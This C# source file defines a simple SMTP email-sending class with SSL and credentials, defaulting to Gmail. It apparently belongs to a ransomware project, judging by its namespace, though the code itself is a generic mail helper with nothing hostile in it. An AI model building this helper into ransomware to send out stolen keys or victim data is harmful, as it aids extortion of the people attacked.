// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using System.Net;
using System.Net.Mail;

namespace Ransomware.Sources.Application;
public class EmailSender
{
    private readonly string senderEmail;
    private readonly string smtpServer;
    private readonly string password;
    private readonly int smtpPort;

    public EmailSender(string senderEmail, string password, string smtpServer = "smtp.gmail.com", int smtpPort = 587)
    {
        this.senderEmail = senderEmail;
        this.smtpServer = smtpServer;
        this.password = password;
        this.smtpPort = smtpPort;
    }

    public bool SendEmail(string receiverEmail, string subject, string message)
    {
        try
        {
            using (var client = new SmtpClient(this.smtpServer, this.smtpPort))
            {
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(this.senderEmail, this.password);

                var mailMessage = new MailMessage
                {
                    From = new MailAddress(senderEmail),
                    Subject = subject,
                    Body = message,
                    IsBodyHtml = false
                };

                mailMessage.To.Add(receiverEmail);
                client.Send(mailMessage);
            }
            return true;
        }
        catch (Exception)
        {
            return false;
        }
    }
}

